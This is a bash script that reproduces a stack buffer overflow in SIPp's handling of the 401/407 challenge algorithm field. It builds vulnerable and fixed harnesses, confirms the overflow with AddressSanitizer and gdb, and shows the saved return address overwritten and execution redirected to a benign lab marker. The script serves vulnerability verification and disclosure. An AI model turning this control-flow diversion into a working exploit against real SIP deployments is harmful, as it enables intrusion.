#!/usr/bin/env bash
# Reproduce CVE-2026-90779: 401/407 challenge algorithm= into algo[32].
# Direct-call builds of pinned SIPp objects, fixed/safe controls and a
# lab-mapped benign marker for the unprotected O0 control-flow diversion.
set -uo pipefail
ROOT=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
cd "$ROOT"
mkdir -p runs evidence
PASS=0
FAIL=0

check() {
    local name=$1 expr=$2
    if eval "$expr"; then printf 'PASS %s\n' "$name"; PASS=$((PASS+1))
    else printf 'FAIL %s\n' "$name"; FAIL=$((FAIL+1)); fi
}
f() { cat "$ROOT/runs/$1.out" 2>/dev/null; }
r() { cat "$ROOT/runs/$1.out.rc" 2>/dev/null; }

link_harness() {
    local variant=$1 mode=$2 source=$3 binary=$4 ver out objs
    case "$variant" in vuln) ver=3.7.7;; fixed) ver=3.7.8;; esac
    out="$ROOT/out-$variant"; [[ $mode == plain ]] && out="$ROOT/out-$variant-plain"
    objcopy --redefine-sym main=sipp_main "$out/CMakeFiles/sipp.dir/src/sipp.cpp.o" \
        "$ROOT/runs/$variant-$mode-main.o"
    objs=$(find "$out/CMakeFiles/sipp.dir" -name '*.o' ! -name 'sipp.cpp.o')
    local flags='-O0 -g'
    [[ $mode == asan ]] && flags="$flags -fsanitize=address -fno-omit-frame-pointer"
    g++ $flags -I "$ROOT/build-$variant/sipp-$ver/include" \
        -I "$ROOT/build-$variant/sipp-$ver/src" -I "$out" \
        "$ROOT/harness/$source" "$ROOT/runs/$variant-$mode-main.o" $objs \
        -ldl -lpthread -lncursesw -ltinfo -lssl -lcrypto -lpcap -lsctp \
        -o "$ROOT/harness/$binary" > "$ROOT/runs/compile-$binary.log" 2>&1
    printf 'COMPILE %s rc=%d\n' "$binary" "$?"
}

link_harness vuln asan  auth_overflow.cpp vuln-asan
link_harness fixed asan  auth_overflow.cpp fixed-asan
link_harness vuln plain  auth_overflow.cpp vuln-plain
link_harness fixed plain  auth_overflow.cpp fixed-plain
link_harness vuln plain  marker_overflow.cpp vuln-marker
link_harness fixed plain marker_overflow.cpp fixed-marker

run() {
    local bin=$1 n=$2 tag=$3
    ASAN_OPTIONS=detect_leaks=0 "$ROOT/harness/$bin" "$n" \
        > "$ROOT/runs/$tag.out" 2>&1
    printf '%d' "$?" > "$ROOT/runs/$tag.out.rc"
}
for n in 8 31 32 33 64; do
    run vuln-asan "$n" "vuln-asan-$n"
    run fixed-asan "$n" "fixed-asan-$n"
done
for n in 31 64; do
    run vuln-plain "$n" "vuln-plain-$n"
    run fixed-plain "$n" "fixed-plain-$n"
done
"$ROOT/harness/vuln-marker" > "$ROOT/runs/marker-vuln.out" 2>&1
printf '%d' "$?" > "$ROOT/runs/marker-vuln.out.rc"
"$ROOT/harness/fixed-marker" > "$ROOT/runs/marker-fixed.out" 2>&1
printf '%d' "$?" > "$ROOT/runs/marker-fixed.out.rc"

gdb -q -batch -ex "directory $ROOT/build-vuln/sipp-3.7.7/src" \
    -x "$ROOT/harness/gdb-readback.cmd" --args "$ROOT/harness/vuln-plain" 64 \
    > "$ROOT/runs/gdb-vuln-64.out" 2>&1
printf '%d' "$?" > "$ROOT/runs/gdb-vuln-64.out.rc"

check 'vuln-asan-n8-clean'  "[[ \$(r vuln-asan-8) == 0 ]] && ! f vuln-asan-8 | grep -q AddressSanitizer"
check 'vuln-asan-n31-clean' "[[ \$(r vuln-asan-31) == 0 ]] && ! f vuln-asan-31 | grep -q AddressSanitizer"
check 'vuln-asan-n32-write1' "[[ \$(r vuln-asan-32) == 1 ]] && f vuln-asan-32 | grep -q 'WRITE of size 1' && f vuln-asan-32 | grep -q 'auth.cpp:190'"
check 'vuln-asan-n33-write33' "[[ \$(r vuln-asan-33) == 1 ]] && f vuln-asan-33 | grep -q 'WRITE of size 33' && f vuln-asan-33 | grep -q 'auth.cpp:189'"
check 'vuln-asan-n64-write64' "[[ \$(r vuln-asan-64) == 1 ]] && f vuln-asan-64 | grep -q 'WRITE of size 64' && f vuln-asan-64 | grep -q 'auth.cpp:189'"
check 'vuln-asan-n64-algo-frame' "f vuln-asan-64 | grep -q \"'algo' (line 170) <== Memory access at offset 64 overflows this variable\""
check 'fixed-asan-all-clean' "[[ \$(r fixed-asan-8) == 0 && \$(r fixed-asan-31) == 0 && \$(r fixed-asan-32) == 0 && \$(r fixed-asan-33) == 0 && \$(r fixed-asan-64) == 0 ]] && ! grep -q AddressSanitizer $ROOT/runs/fixed-asan-*.out"
check 'vuln-plain-n31-rc0'   "[[ \$(r vuln-plain-31) == 0 ]]"
check 'vuln-plain-n64-rc139' "[[ \$(r vuln-plain-64) == 139 ]]"
check 'fixed-plain-both-rc0' "[[ \$(r fixed-plain-31) == 0 && \$(r fixed-plain-64) == 0 ]]"
check 'gdb-saved-rip-chosen' "f gdb-vuln-64 | grep -q HIT_LINE_190 && f gdb-vuln-64 | grep -q '0x4141414141414141.*0x4141414141414141'"
check 'marker-vuln-executed' "[[ \$(r marker-vuln) == 0 ]] && f marker-vuln | grep -q SIPP_AUTH_MARKER"
check 'marker-fixed-returns' "[[ \$(r marker-fixed) == 0 ]] && ! f marker-fixed | grep -q SIPP_AUTH_MARKER"
check 'vuln-source-unbounded' "grep -q 'strncpy(algo, start, end - start)' $ROOT/build-vuln/sipp-3.7.7/src/auth.cpp"
check 'fixed-source-bounded' "grep -q 'getAuthParameter(\"algorithm\", auth, algo, sizeof(algo))' $ROOT/build-fixed/sipp-3.7.8/src/auth.cpp"

printf 'TOTAL: %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[[ $FAIL -eq 0 ]]
